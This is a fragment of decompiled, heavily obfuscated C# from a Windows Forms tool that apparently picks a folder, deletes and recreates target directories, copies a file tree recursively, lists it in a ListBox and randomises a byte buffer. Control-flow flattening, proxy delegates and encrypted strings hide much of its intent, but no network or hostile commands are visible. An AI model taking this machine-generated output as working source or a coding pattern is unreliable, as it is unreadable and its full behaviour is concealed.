											}
											num4 = -4;
											goto IL_008f;
											IL_01e0:
											num3 = -2;
											goto end_IL_01d3;
											IL_0102:
											switch (num2)
											{
											case 41:
												break;
											case 42:
												goto IL_0143;
											case 43:
												goto IL_0148;
											case 44:
												goto IL_0188;
											default:
												goto IL_01e6;
											case 45:
												return result;
											}
											Delegate60.smethod_0(object_, dataSet, Class41.smethod_0(27458));
											num2 = Class43.smethod_0(8);
											goto IL_018b;
											IL_01e6:
											num3 = -3;
											goto end_IL_01d3;
											IL_0188:
											num2 = 3;
											goto IL_018b;
											IL_0148:
											result = Delegate66.smethod_0(Delegate65.smethod_0(Delegate64.smethod_0(Delegate63.smethod_0(Delegate62.smethod_0(Delegate61.smethod_0(dataSet), Class41.smethod_0(27458))), Class43.smethod_0(0)), Class41.smethod_0(27472)));
											num2 = 2;
											goto IL_018b;
											IL_0143:
											num2 = 6;
											goto IL_018b;
											IL_009b:
											num5 = Class43.smethod_0(1);
											continue;
											IL_018b:
											num2 ^= Class43.smethod_0(103);
											goto IL_0197;
											IL_0197:
											num3 = Class35.smethod_0(8);
											num4 = -3;
											goto IL_008f;
											IL_008f:
											num4 ^= Class43.smethod_0(101);
											goto IL_009b;
											IL_00d8:
											num4 = Class5.smethod_0(5);
											goto IL_008f;
											continue;
											end_IL_01a8:
											break;
										}
										continue;
										end_IL_01d3:
										break;
									}
									continue;
									end_IL_01ea:
									break;
								}
							}
						}
						catch (Exception exception_)
						{
							Delegate18.smethod_0(exception_);
							result = Class41.smethod_0(27486);
							Delegate47.smethod_0();
							return result;
						}
					}
					}
					break;
				}
			}
		}
		finally
		{
			if (val != null || 1 == 0)
			{
				Delegate67.smethod_0(val);
			}
		}
	}

	public static void smethod_0(Bitmap bitmap_0, Bitmap bitmap_1, Bitmap bitmap_2)
	{
		Class22.smethod_0(2424906, null, bitmap_0, bitmap_1, bitmap_2);
	}

	private void method_3(object sender, EventArgs e)
	{
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Invalid comparison between Unknown and I4
		//IL_0522: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e6: Unknown result type (might be due to invalid IL or missing references)
		Delegate74.smethod_0(Delegate73.smethod_0(ListBox_0));
		Delegate75.smethod_0(Label_1, string.Empty);
		bool flag = default(bool);
		bool flag2 = default(bool);
		OpenFileDialog object_ = default(OpenFileDialog);
		while (true)
		{
			int num = Class5.smethod_0(11);
			while (true)
			{
				switch (num ^ Class43.smethod_0(101))
				{
				case -33:
					num = -8;
					continue;
				case -34:
					Delegate75.smethod_0(Label_5, string.Empty);
					num = -5;
					continue;
				case -35:
					num = -7;
					continue;
				case -36:
					Delegate75.smethod_0(Label_7, string.Empty);
					num = -60;
					continue;
				case -37:
					num = -6;
					continue;
				case -38:
					Delegate75.smethod_0(Label_3, string.Empty);
					num = Class35.smethod_0(8);
					continue;
				case -32:
					try
					{
						while (true)
						{
							int num2 = Class43.smethod_0(1);
							int num3 = -50;
							while (true)
							{
								switch (num3 ^ Class43.smethod_0(97))
								{
								case -32:
									num2 ^= Class43.smethod_0(102);
									goto default;
								default:
									num3 = Class35.smethod_0(12);
									continue;
								case -33:
									switch (num2)
									{
									default:
										num3 = -16;
										continue;
									case 38:
										flag = (int)Delegate76.smethod_0(object_) == Class43.smethod_0(1);
										num2 = Class43.smethod_0(75);
										break;
									case 39:
										if (flag)
										{
											num2 = 2;
											break;
										}
										if (1 == 0)
										{
											goto case 42;
										}
										goto IL_057e;
									case 40:
										num2 = 0;
										break;
									case 41:
										object_ = OpenFileDialog_0;
										num2 = 14;
										break;
									case 42:
										{
											string_0 = Delegate77.smethod_0(object_);
											while (true)
											{
												int num4 = Class16.smethod_0(35);
												int num5 = 8;
												while (true)
												{
													num5 ^= Class43.smethod_0(93);
													while (true)
													{
														int num6 = Class5.smethod_0(11);
														int num7 = -3;
														while (true)
														{
															num7 ^= Class43.smethod_0(96);
															while (true)
															{
																int num8 = Class43.smethod_0(19);
																while (true)
																{
																	switch (num8 ^ Class43.smethod_0(94))
																	{
																	case 43:
																		break;
																	case 42:
																		goto IL_0199;
																	case 41:
																		num8 = Class43.smethod_0(8);
																		continue;
																	default:
																		goto end_IL_03b3;
																	case 44:
																		goto end_IL_03d9;
																	}
																	goto IL_0189;
																	IL_0199:
																	switch (num7)
																	{
																	case -39:
																		goto IL_01bb;
																	case -37:
																		goto IL_039a;
																	case -40:
																		goto IL_03e4;
																	case -38:
																		goto end_IL_03f3;
																	}
																	num8 = 6;
																	continue;
																	IL_03e4:
																	num7 = Class5.smethod_0(11);
																	goto end_IL_03d9;
																	IL_01bb:
																	switch (num6)
																	{
																	case -46:
																		break;
																	case -45:
																		goto IL_0382;
																	case -44:
																		goto IL_0396;
																	default:
																		goto IL_03ef;
																	case -43:
																		goto end_IL_0401;
																	}
																	switch (num5)
																	{
																	case 41:
																		goto IL_01fc;
																	case 43:
																		goto IL_0376;
																	case 40:
																		goto IL_0410;
																	case 42:
																		goto end_IL_041f;
																	}
																	num6 = -1;
																	goto IL_039a;
																	IL_03ef:
																	num7 = -4;
																	goto end_IL_03d9;
																	IL_0396:
																	num6 = -8;
																	goto IL_039a;
																	IL_0452:
																	if (Delegate82.smethod_0(string_5) || 1 == 0)
																	{
																		Delegate83.smethod_0(string_5, (byte)Class43.smethod_0(1) != 0);
																	}
																	while (true)
																	{
																		int num9 = Class43.smethod_0(84);
																		while (true)
																		{
																			switch (num9 ^ Class43.smethod_0(104))
																			{
																			case 52:
																				Delegate84.smethod_0(string_5);
																				num9 = 28;
																				continue;
																			case 51:
																				Delegate84.smethod_0(string_4);
																				num9 = 24;
																				continue;
																			case 50:
																				num9 = 29;
																				continue;
																			case 49:
																				method_5(string_4, Class43.smethod_0(0));
																				num9 = 2;
																				continue;
																			case 48:
																				method_4(string_1, string_4);
																				num9 = 7;
																				continue;
																			case 47:
																				num9 = 3;
																				continue;
																			case 46:
																				num9 = Class43.smethod_0(0);
																				continue;
																			case 45:
																				method_4(string_4, string_5);
																				num9 = 30;
																				continue;
																			case 44:
																				Delegate85.smethod_0(Class41.smethod_0(27500), string.Empty, (MessageBoxButtons)Class43.smethod_0(0), (MessageBoxIcon)Class43.smethod_0(32));
																				num9 = 25;
																				continue;
																			case 43:
																				num9 = 1;
																				continue;
																			case 53:
																				goto end_IL_0573;
																			}
																			break;
																		}
																		continue;
																		end_IL_0573:
																		break;
																	}
																	goto end_IL_042d;
																	IL_0410:
																	num5 = Class43.smethod_0(73);
																	goto end_IL_0401;
																	IL_01fc:
																	switch (num4)
																	{
																	case -35:
																		break;
																	case -34:
																		goto IL_0256;
																	case -33:
																		goto IL_025f;
																	case -32:
																		goto IL_0291;
																	case -31:
																		goto IL_02ab;
																	case -30:
																		goto IL_02b4;
																	case -29:
																		goto IL_02ce;
																	case -28:
																		goto IL_02ed;
																	case -27:
																		goto IL_0315;
																	case -26:
																		goto IL_032c;
																	case -25:
																		goto IL_0332;
																	case -24:
																		goto IL_0344;
																	case -23:
																		goto IL_036c;
																	case -22:
																		goto IL_0372;
																	default:
																		goto IL_041b;
																	case -21:
																		goto IL_0441;
																	}
																	if (flag2)
																	{
																		num4 = -59;
																		goto IL_0376;
																	}
																	if (1 == 0)
																	{
																		goto IL_0441;
																	}
																	goto IL_0452;
																	IL_041b:
																	num5 = 9;
																	goto end_IL_0401;
																	IL_0372:
																	num4 = -15;
																	goto IL_0376;
																	IL_036c:
																	num4 = -57;
																	goto IL_0376;
																	IL_0344:
																	string_5 = Delegate81.smethod_0(string_3, Delegate80.smethod_0(string_1, Class43.smethod_0(2)));
																	num4 = -50;
																	goto IL_0376;
																	IL_0332:
																	flag2 = Delegate82.smethod_0(string_4);
																	num4 = -13;
																	goto IL_0376;
																	IL_032c:
																	num4 = -54;
																	goto IL_0376;
																	IL_0315:
																	Delegate75.smethod_0(Label_3, string_1);
																	num4 = -56;
																	goto IL_0376;
																	IL_02ed:
																	string_4 = Delegate81.smethod_0(string_2, Delegate80.smethod_0(string_1, Class43.smethod_0(2)));
																	num4 = -58;
																	goto IL_0376;
																	IL_02ce:
																	Delegate75.smethod_0(Label_1, Delegate77.smethod_0(object_));
																	num4 = Class16.smethod_0(31);
																	goto IL_0376;
																	IL_02b4:
																	Delegate75.smethod_0(Label_7, string_5);
																	num4 = -49;
																	goto IL_0376;
																	IL_02ab:
																	num4 = -55;
																	goto IL_0376;
																	IL_0291:
																	Delegate75.smethod_0(Label_5, string_4);
																	num4 = -16;
																	goto IL_0376;
																	IL_025f:
																	string_1 = Delegate79.smethod_0(Delegate77.smethod_0(object_), Class43.smethod_0(0), Delegate78.smethod_0(Delegate77.smethod_0(object_), (char)Class43.smethod_0(31)));
																	num4 = -53;
																	goto IL_0376;
																	IL_0256:
																	num4 = -52;
																	goto IL_0376;
																	IL_0441:
																	Delegate83.smethod_0(string_4, (byte)Class43.smethod_0(1) != 0);
																	goto IL_0452;
																	IL_039a:
																	num6 ^= Class43.smethod_0(104);
																	goto IL_0189;
																	IL_0376:
																	num4 ^= Class43.smethod_0(97);
																	goto IL_0382;
																	IL_0382:
																	num5 = Class43.smethod_0(59);
																	num6 = Class35.smethod_0(10);
																	goto IL_039a;
																	IL_0189:
																	num7 = Class35.smethod_0(8);
																	num8 = 1;
																	continue;
																	end_IL_03b3:
																	break;
																}
																continue;
																end_IL_03d9:
																break;
															}
															continue;
															end_IL_03f3:
															break;
														}
														continue;
														end_IL_0401:
														break;
													}
													continue;
													end_IL_041f:
													break;
												}
												continue;
												end_IL_042d:
												break;
											}
											goto IL_057e;
										}
										IL_057e:
										object_ = null;
										return;
									}
									goto case -32;
								case -35:
									num3 = Class5.smethod_0(6);
									continue;
								case -34:
									break;
								}
								break;
							}
						}
					}
					catch (Exception ex)
					{
						Delegate18.smethod_0(ex);
						Exception object_2 = ex;
						while (true)
						{
							int num10 = Class35.smethod_0(12);
							while (true)
							{
								switch (num10 ^ Class43.smethod_0(103))
								{
								case -34:
									num10 = -14;
									continue;
								case -35:
									Delegate85.smethod_0(Delegate20.smethod_0(object_2), Class41.smethod_0(27539), (MessageBoxButtons)Class43.smethod_0(0), (MessageBoxIcon)Class43.smethod_0(33));
									num10 = Class5.smethod_0(6);
									continue;
								case -36:
									Delegate47.smethod_0();
									num10 = -16;
									continue;
								case -37:
									num10 = -12;
									continue;
								case -33:
									return;
								}
								break;
							}
						}
					}
				}
				break;
			}
		}
	}

	public static byte[] smethod_1(Bitmap bitmap_0)
	{
		return (byte[])Class22.smethod_0(2425332, null, bitmap_0);
	}

	private void method_4(string string_6, string string_7)
	{
		checked
		{
			if (((Delegate98.smethod_0(string_7, Delegate97.smethod_0(string_7) - Class43.smethod_0(1)) == Path.DirectorySeparatorChar) ? 1 : 0) == Class43.smethod_0(0) || 1 == 0)
			{
				string_7 = Delegate81.smethod_0(string_7, Delegate99.smethod_0(Path.DirectorySeparatorChar));
			}
			if ((Delegate82.smethod_0(string_7) ? 1 : 0) == Class43.smethod_0(0) || 1 == 0)
			{
				Delegate84.smethod_0(string_7);
			}
			string[] array = Delegate100.smethod_0(string_6);
			for (int i = Class43.smethod_0(0); i < array.Length; i += Class43.smethod_0(1))
			{
				if (1 == 0)
				{
					break;
				}
				string text = array[i];
				if (Delegate82.smethod_0(text) || 1 == 0)
				{
					string text2 = Delegate80.smethod_0(text, Delegate78.smethod_0(text, Path.DirectorySeparatorChar) + Class43.smethod_0(1));
					if ((Delegate101.smethod_0(list_0, text2) ? 1 : 0) == Class43.smethod_0(0) || 1 == 0)
					{
						method_4(text, Delegate81.smethod_0(string_7, Delegate102.smethod_0(text)));
					}
					continue;
				}
				while (true)
				{
					int num = Class35.smethod_0(17);
					int num2 = 8;
					while (true)
					{
						num2 ^= Class43.smethod_0(103);
						while (true)
						{
							int num3 = Class35.smethod_0(17);
							int num4 = 27;
							while (true)
							{
								num4 ^= Class43.smethod_0(98);
								while (true)
								{
									int num5 = Class43.smethod_0(88);
									int num6 = -4;
									while (true)
									{
										num6 ^= Class43.smethod_0(93);
										while (true)
										{
											int num7 = Class5.smethod_0(4);
											int num8 = 4;
											while (true)
											{
												num8 ^= Class43.smethod_0(95);
												while (true)
												{
													int num9 = Class35.smethod_0(10);
													int num10 = -58;
													while (true)
													{
														switch (num10 ^ Class43.smethod_0(101))
														{
														case -30:
															break;
														default:
															goto IL_00e9;
														case -32:
															goto IL_00f7;
														case -33:
															num10 = -5;
															continue;
														case -31:
															goto end_IL_02eb;
														}
														goto IL_00dd;
														IL_00f7:
														switch (num9)
														{
														case -46:
															goto IL_011f;
														case -47:
															goto IL_02ce;
														case -45:
															goto IL_02de;
														case -44:
															goto end_IL_0316;
														}
														num10 = Class16.smethod_0(26);
														continue;
														IL_02de:
														num9 = -8;
														goto IL_00dd;
														IL_011f:
														switch (num8)
														{
														case 42:
															goto IL_0144;
														case 45:
															goto IL_02c2;
														case 43:
															goto IL_032a;
														case 44:
															goto end_IL_032d;
														}
														num9 = Class5.smethod_0(9);
														goto IL_00dd;
														IL_032a:
														num8 = 2;
														goto end_IL_0316;
														IL_0144:
														switch (num7)
														{
														case -38:
															break;
														case -37:
															goto IL_016c;
														case -36:
															goto IL_02b5;
														default:
															goto IL_0325;
														case -35:
															goto end_IL_033b;
														}
														num7 = -9;
														goto IL_02c2;
														IL_0325:
														num8 = 5;
														goto end_IL_0316;
														IL_016c:
														switch (num6)
														{
														case -35:
															goto IL_0194;
														case -33:
															goto IL_02a9;
														case -36:
															goto IL_0348;
														case -34:
															goto end_IL_0356;
														}
														num7 = Class35.smethod_0(12);
														goto IL_02c2;
														IL_0348:
														num6 = Class35.smethod_0(8);
														goto end_IL_033b;
														IL_0194:
														switch (num5)
														{
														case 47:
															break;
														case 48:
															goto IL_01bb;
														case 49:
															goto IL_0298;
														default:
															goto IL_0352;
														case 50:
															goto end_IL_0364;
														}
														num5 = 1;
														goto IL_02a9;
														IL_0352:
														num6 = -3;
														goto end_IL_033b;
														IL_01bb:
														switch (num4)
														{
														case 47:
															goto IL_01de;
														case 48:
															goto IL_028c;
														case 46:
															goto IL_0373;
														case 45:
															goto end_IL_037b;
														}
														num5 = 31;
														goto IL_02a9;
														IL_0373:
														num4 = 5;
														goto end_IL_0364;
														IL_01de:
														switch (num3)
														{
														case -36:
															break;
														case -37:
															goto IL_0274;
														case -35:
															goto IL_0288;
														default:
															goto IL_0378;
														case -34:
															goto end_IL_0389;
														}
														switch (num2)
														{
														case 38:
															goto IL_021d;
														case 39:
															goto IL_0268;
														case 37:
															goto IL_0398;
														case 36:
															goto end_IL_03a2;
														}
														num3 = -14;
														goto IL_028c;
														IL_0378:
														num4 = 6;
														goto end_IL_0364;
														IL_0288:
														num3 = -12;
														goto IL_028c;
														IL_02b5:
														num6 = Class5.smethod_0(11);
														num7 = -16;
														goto IL_02c2;
														IL_0398:
														num2 = 10;
														goto end_IL_0389;
														IL_021d:
														switch (num)
														{
														case -35:
															break;
														case -34:
															goto IL_0242;
														case -33:
															goto IL_0260;
														default:
															goto IL_039e;
														case -32:
															goto end_IL_03b0;
														}
														num = -53;
														goto IL_0268;
														IL_039e:
														num2 = 11;
														goto end_IL_0389;
														IL_0260:
														num = Class5.smethod_0(3);
														goto IL_0268;
														IL_0242:
														Delegate103.smethod_0(text, Delegate81.smethod_0(string_7, Delegate102.smethod_0(text)), unchecked((byte)Class43.smethod_0(1)) != 0);
														num = -10;
														goto IL_0268;
														IL_00e9:
														num10 = Class16.smethod_0(31);
														continue;
														IL_0268:
														num ^= Class43.smethod_0(98);
														goto IL_0274;
														IL_0274:
														num2 = Class43.smethod_0(57);
														num3 = Class16.smethod_0(28);
														goto IL_028c;
														IL_00dd:
														num9 ^= Class43.smethod_0(98);
														goto IL_00e9;
														IL_028c:
														num3 ^= Class43.smethod_0(95);
														goto IL_0298;
														IL_0298:
														num4 = Class43.smethod_0(8);
														num5 = Class43.smethod_0(79);
														goto IL_02a9;
														IL_02c2:
														num7 ^= Class43.smethod_0(94);
														goto IL_02ce;
														IL_02ce:
														num8 = Class43.smethod_0(2);
														num9 = -1;
														goto IL_00dd;
														IL_02a9:
														num5 ^= Class43.smethod_0(97);
														goto IL_02b5;
														continue;
														end_IL_02eb:
														break;
													}
													continue;
													end_IL_0316:
													break;
												}
												continue;
												end_IL_032d:
												break;
											}
											continue;
											end_IL_033b:
											break;
										}
										continue;
										end_IL_0356:
										break;
									}
									continue;
									end_IL_0364:
									break;
								}
								continue;
								end_IL_037b:
								break;
							}
							continue;
							end_IL_0389:
							break;
						}
						continue;
						end_IL_03a2:
						break;
					}
					continue;
					end_IL_03b0:
					break;
				}
			}
		}
	}

	public static byte[] smethod_2(byte[] byte_0, int int_0 = 16)
	{
		return (byte[])Class22.smethod_0(2426672, null, byte_0, int_0);
	}

	private void method_5(string string_6, int int_0 = 0)
	{
		Delegate106.smethod_0(Delegate73.smethod_0(ListBox_0), Delegate81.smethod_0(Delegate105.smethod_0((char)Class43.smethod_0(35), checked(int_0 * Class43.smethod_0(7))), string_6));
		string[] array = Delegate107.smethod_0(string_6);
		checked
		{
			for (int i = Class43.smethod_0(0); i < array.Length; i += Class43.smethod_0(1))
			{
				if (1 == 0)
				{
					break;
				}
				string text = array[i];
				while (true)
				{
					int num = Class43.smethod_0(57);
					int num2 = 3;
					while (true)
					{
						switch (num2 ^ Class43.smethod_0(101))
						{
						case 39:
							num ^= Class43.smethod_0(101);
							goto default;
						default:
							num2 = Class43.smethod_0(0);
							continue;
						case 37:
							num2 = Class43.smethod_0(1);
							continue;
						case 36:
							switch (num)
							{
							default:
								num2 = 2;
								continue;
							case 45:
								Delegate106.smethod_0(Delegate73.smethod_0(ListBox_0), Delegate81.smethod_0(Delegate105.smethod_0(unchecked((char)Class43.smethod_0(35)), int_0 * Class43.smethod_0(7) + Class43.smethod_0(7)), text));
								num = Class43.smethod_0(59);
								break;
							case 46:
								num = 20;
								break;
							case 47:
								num = 11;
								break;
							case 48:
								goto end_IL_0106;
							}
							goto case 39;
						case 38:
							break;
						}
						break;
					}
					continue;
					end_IL_0106:
					break;
				}
			}
			string[] array2 = Delegate108.smethod_0(string_6);
			for (int j = Class43.smethod_0(0); j < array2.Length; j += Class43.smethod_0(1))
			{
				if (1 == 0)
				{
					break;
				}
				string string_7 = array2[j];
				while (true)
				{
					int num3 = Class5.smethod_0(6);
					int num4 = 11;
					while (true)
					{
						num4 ^= Class43.smethod_0(81);
						while (true)
						{
							int num5 = Class43.smethod_0(73);
							int num6 = 14;
							while (true)
							{
								num6 ^= Class43.smethod_0(93);
								while (true)
								{
									int num7 = Class5.smethod_0(3);
									int num8 = 21;
									while (true)
									{
										num8 ^= Class43.smethod_0(105);
										while (true)
										{
											int num9 = Class43.smethod_0(19);
											int num10 = 18;
											while (true)
											{
												switch (num10 ^ Class43.smethod_0(93))
												{
												case 49:
													break;
												default:
													goto IL_0165;
												case 47:
													num10 = 12;
													continue;
												case 46:
													goto IL_017c;
												case 48:
													goto end_IL_02fe;
												}
												goto IL_0159;
												IL_017c:
												switch (num9)
												{
												case 34:
													goto IL_019f;
												case 35:
													goto IL_01aa;
												case 36:
													goto IL_02ed;
												case 37:
													goto end_IL_0329;
												}
												num10 = 19;
												continue;
												IL_01aa:
												switch (num8)
												{
												case 46:
													goto IL_01c9;
												case 48:
													goto IL_02e1;
												case 45:
													goto IL_0338;
												case 47:
													goto end_IL_0346;
												}
												num9 = 0;
												goto IL_0159;
												IL_0338:
												num8 = 8;
												goto end_IL_0329;
												IL_01c9:
												switch (num7)
												{
												case -40:
													break;
												case -39:
													goto IL_01f1;
												case -41:
													goto IL_02d4;
												default:
													goto IL_033d;
												case -38:
													goto end_IL_0354;
												}
												num7 = -11;
												goto IL_02e1;
												IL_033d:
												num8 = Class43.smethod_0(59);
												goto end_IL_0329;
												IL_01f1:
												switch (num6)
												{
												case 44:
													goto IL_0214;
												case 45:
													goto IL_02c8;
												case 43:
													goto IL_0362;
												case 42:
													goto end_IL_0371;
												}
												num7 = -6;
												goto IL_02e1;
												IL_0362:
												num6 = Class43.smethod_0(53);
												goto end_IL_0354;
												IL_0214:
												switch (num5)
												{
												case 46:
													break;
												case 47:
													goto IL_0241;
												case 48:
													goto IL_02bb;
												default:
													goto IL_036d;
												case 49:
													goto end_IL_037f;
												}
												num5 = Class43.smethod_0(59);
												goto IL_02c8;
												IL_036d:
												num6 = 9;
												goto end_IL_0354;
												IL_0241:
												switch (num4)
												{
												case 41:
													goto IL_0261;
												case 42:
													goto IL_02af;
												case 39:
													goto IL_038e;
												case 40:
													goto end_IL_039c;
												}
												num5 = 20;
												goto IL_02c8;
												IL_038e:
												num4 = 6;
												goto end_IL_037f;
												IL_0261:
												switch (num3)
												{
												case -44:
													break;
												case -43:
													goto IL_028a;
												case -42:
													goto IL_0290;
												case -41:
													goto IL_02ab;
												default:
													goto IL_0393;
												case -40:
													goto end_IL_03aa;
												}
												num3 = -3;
												goto IL_02af;
												IL_0393:
												num4 = Class43.smethod_0(57);
												goto end_IL_037f;
												IL_02ab:
												num3 = -14;
												goto IL_02af;
												IL_0290:
												method_5(string_7, int_0 + Class43.smethod_0(1));
												num3 = Class35.smethod_0(16);
												goto IL_02af;
												IL_028a:
												num3 = -15;
												goto IL_02af;
												IL_0165:
												num10 = Class43.smethod_0(46);
												continue;
												IL_02af:
												num3 ^= Class43.smethod_0(105);
												goto IL_02bb;
												IL_02bb:
												num4 = Class43.smethod_0(53);
												num5 = 21;
												goto IL_02c8;
												IL_0159:
												num9 ^= Class43.smethod_0(101);
												goto IL_0165;
												IL_02e1:
												num7 ^= Class43.smethod_0(94);
												goto IL_02ed;
												IL_02c8:
												num5 ^= Class43.smethod_0(101);
												goto IL_02d4;
												IL_02d4:
												num6 = Class43.smethod_0(75);
												num7 = -9;
												goto IL_02e1;
												IL_019f:
												num9 = Class43.smethod_0(30);
												goto IL_0159;
												IL_02ed:
												num8 = Class43.smethod_0(73);
												num9 = 1;
												goto IL_0159;
												continue;
												end_IL_02fe:
												break;
											}
											continue;
											end_IL_0329:
											break;
										}
										continue;
										end_IL_0346:
										break;
									}
									continue;
									end_IL_0354:
									break;
								}
								continue;
								end_IL_0371:
								break;
							}
							continue;
							end_IL_037f:
							break;
						}
						continue;
						end_IL_039c:
						break;
					}
					continue;
					end_IL_03aa:
					break;
				}
			}
		}
	}

	public static byte[] smethod_3(Bitmap bitmap_0)
	{
		return (byte[])Class22.smethod_0(2427228, null, bitmap_0);
	}

	public static T smethod_4<T>(DataGridViewRow dataGridViewRow_0)
	{
		T result = default(T);
		try
		{
			result = Conversions.ToGenericParameter<T>(Delegate109.smethod_0(dataGridViewRow_0));
			return result;
		}
		catch (Exception exception_)
		{
			Delegate18.smethod_0(exception_);
			while (true)
			{
				int num = Class43.smethod_0(0);
				while (true)
				{
					switch (num ^ Class43.smethod_0(100))
					{
					case 39:
						num = 3;
						continue;
					case 38:
						Delegate47.smethod_0();
						num = 15;
						continue;
					case 37:
						num = 2;
						continue;
					case 36:
						result = default(T);
						num = Class43.smethod_0(1);
						continue;
					case 40:
						return result;
					}
					break;
				}
			}
		}
	}

	public static string[] smethod_5(byte[] byte_0)
	{
		return (string[])Class22.smethod_0(2427389, null, byte_0);
	}

	public byte[] method_6(ref byte[] byte_0, int int_0 = 0, int int_1 = 255)
	{
		if (((((byte_0.Length > Class43.smethod_0(0)) ? 1 : 0) == Class43.smethod_0(0)) | (int_0 < Class43.smethod_0(0)) | (int_1 > Class43.smethod_0(36))) || 1 == 0)
		{
			return byte_0;
		}
		if (int_0 > int_1 || 1 == 0)
		{
			return byte_0;
		}
		checked
		{
			int_1 += Class43.smethod_0(1);
			int i = default(int);
			int num6 = default(int);
			Random object_ = default(Random);
			while (true)
			{
				int num = Class5.smethod_0(11);
				int num2 = 4;
				while (true)
				{
					num2 ^= Class43.smethod_0(94);
					while (true)
					{
						int num3 = Class5.smethod_0(5);
						int num4 = 4;
						while (true)
						{
							num4 ^= Class43.smethod_0(93);
							while (true)
							{
								int num5 = Class5.smethod_0(11);
								while (true)
								{
									switch (num5 ^ Class43.smethod_0(93))
									{
									case -34:
										break;
									case -35:
										goto IL_0070;
									case -36:
										num5 = -1;
										continue;
									default:
										goto end_IL_0165;
									case -33:
										goto end_IL_018b;
									}
									goto IL_005e;
									IL_0070:
									switch (num4)
									{
									case 36:
										goto IL_0093;
									case 39:
										goto IL_0151;
									case 38:
										goto IL_019b;
									case 37:
										goto end_IL_01a3;
									}
									num5 = -3;
									continue;
									IL_019b:
									num4 = Class43.smethod_0(3);
									goto end_IL_018b;
									IL_0093:
									switch (num3)
									{
									case -35:
										break;
									case -33:
										goto IL_00bb;
									case -34:
										goto IL_013f;
									default:
										goto IL_0196;
									case -32:
										goto end_IL_01b1;
									}
									num3 = -16;
									goto IL_0151;
									IL_0196:
									num4 = 6;
									goto end_IL_018b;
									IL_00bb:
									switch (num2)
									{
									case 38:
										goto IL_00db;
									case 41:
										goto IL_0133;
									case 40:
										goto IL_01c4;
									case 39:
										goto end_IL_01c7;
									}
									num3 = -13;
									goto IL_0151;
									IL_01c4:
									num2 = 5;
									goto end_IL_01b1;
									IL_00db:
									switch (num)
									{
									case -39:
										break;
									case -38:
										goto IL_0109;
									case -37:
										goto IL_0116;
									case -36:
										goto IL_0129;
									default:
										goto IL_01be;
									case -35:
										for (; i <= num6; i += Class43.smethod_0(1))
										{
											byte_0[i] = (byte)Delegate114.smethod_0(object_, int_0, int_1);
										}
										return byte_0;
									}
									num = Resources.smethod_0(34);
									goto IL_0133;
									IL_01be:
									num2 = 10;
									goto end_IL_01b1;
									IL_0129:
									object_ = Delegate113.smethod_0();
									num = -7;
									goto IL_0133;
									IL_0116:
									num6 = byte_0.Length - Class43.smethod_0(1);
									num = -8;
									goto IL_0133;
									IL_0109:
									i = Class43.smethod_0(0);
									num = -1;
									goto IL_0133;
									IL_005e:
									num4 = Class43.smethod_0(19);
									num5 = -4;
									continue;
									IL_0133:
									num ^= Class43.smethod_0(85);
									goto IL_013f;
									IL_013f:
									num2 = Class43.smethod_0(73);
									num3 = Class16.smethod_0(35);
									goto IL_0151;
									IL_0151:
									num3 ^= Class43.smethod_0(94);
									goto IL_005e;
									continue;
									end_IL_0165:
									break;
								}
								continue;
								end_IL_018b:
								break;
							}
							continue;
							end_IL_01a3:
							break;
						}
						continue;
						end_IL_01b1:
						break;
					}
					continue;
					end_IL_01c7:
					break;
				}
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (((((!disposing) ? true : false) ? Class43.smethod_0(0) : ((icontainer_0 != null) ? 1 : 0)) == 0) ? true : false)
			{
				return;
			}
			while (true)
			{
				int num = Class43.smethod_0(75);
				int num2 = 17;
				while (true)
				{
					num2 ^= Class43.smethod_0(93);
					while (true)
					{
						int num3 = Class5.smethod_0(5);
						int num4 = Class35.smethod_0(17);
						while (true)
						{
							switch (num4 ^ Class43.smethod_0(97))
							{
							case -37:
								break;
							default:
								goto IL_0035;
							case -38:
								num4 = -12;
								continue;
							case -39:
								goto IL_004c;
							case -40:
								goto end_IL_00df;
							}
							goto IL_002b;
							IL_004c:
							switch (num3)
							{
							case -40:
								goto IL_006b;
							case -39:
								goto IL_00c7;
							case -38:
								goto IL_00cf;
							case -37:
								goto end_IL_010a;
							}
							num4 = -10;
							continue;
							IL_00c7:
							num3 = -13;
							goto IL_002b;
							IL_006b:
							switch (num2)
							{
							case 49:
								goto IL_0089;
							case 50:
								goto IL_00bb;
							case 48:
								goto IL_011c;
							case 47:
								goto end_IL_0124;
							}
							num3 = -16;
							goto IL_002b;
							IL_011c:
							num2 = 19;
							goto end_IL_010a;
							IL_0089:
							switch (num)
							{
							case 43:
								break;
							case 44:
								goto IL_00a8;
							case 45:
								goto IL_00b8;
							default:
								goto IL_0121;
							case 46:
								return;
							}
							num = 8;
							goto IL_00bb;
							IL_0121:
							num2 = 12;
							goto end_IL_010a;
							IL_00b8:
							num = 13;
							goto IL_00bb;
							IL_00a8:
							Delegate67.smethod_0(icontainer_0);
							num = 14;
							goto IL_00bb;
							IL_0035:
							num4 = Class16.smethod_0(28);
							continue;
							IL_00bb:
							num ^= Class43.smethod_0(93);
							goto IL_00cf;
							IL_00cf:
							num2 = Class43.smethod_0(77);
							num3 = -15;
							goto IL_002b;
							IL_002b:
							num3 ^= Class43.smethod_0(99);
							goto IL_0035;
							continue;
							end_IL_00df:
							break;
						}
						continue;
						end_IL_010a:
						break;
					}
					continue;
					end_IL_0124:
					break;
				}
			}
		}
		finally
		{
			Delegate115.smethod_0(this, disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_7()
	{
		//IL_018c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0196: Expected O, but got Unknown
		ComponentResourceManager object_ = default(ComponentResourceManager);
		while (true)
		{
			int num = Class5.smethod_0(6);
			while (true)
			{
				num ^= Class43.smethod_0(105);
				switch (num)
				{
				case -21:
					Delegate125.smethod_0(Label_0, Class41.smethod_0(26893));
					Delegate126.smethod_0(Label_0, new Size(Class43.smethod_0(39), Class43.smethod_0(43)));
					Delegate127.smethod_0(Label_0, Class43.smethod_0(1));
					Delegate75.smethod_0(Label_0, Class41.smethod_0(26900));
					Delegate136.smethod_0(Label_0, (ContentAlignment)Class43.smethod_0(34));
					Delegate137.smethod_0(Label_1, (byte)Class43.smethod_0(1) != 0);
					num = -3;
					continue;
				case -22:
					Delegate125.smethod_0(Label_8, Class41.smethod_0(26863));
					Delegate126.smethod_0(Label_8, new Size(Class43.smethod_0(50), Class43.smethod_0(46)));
					Delegate127.smethod_0(Label_8, Class43.smethod_0(59));
					Delegate75.smethod_0(Label_8, Class41.smethod_0(26870));
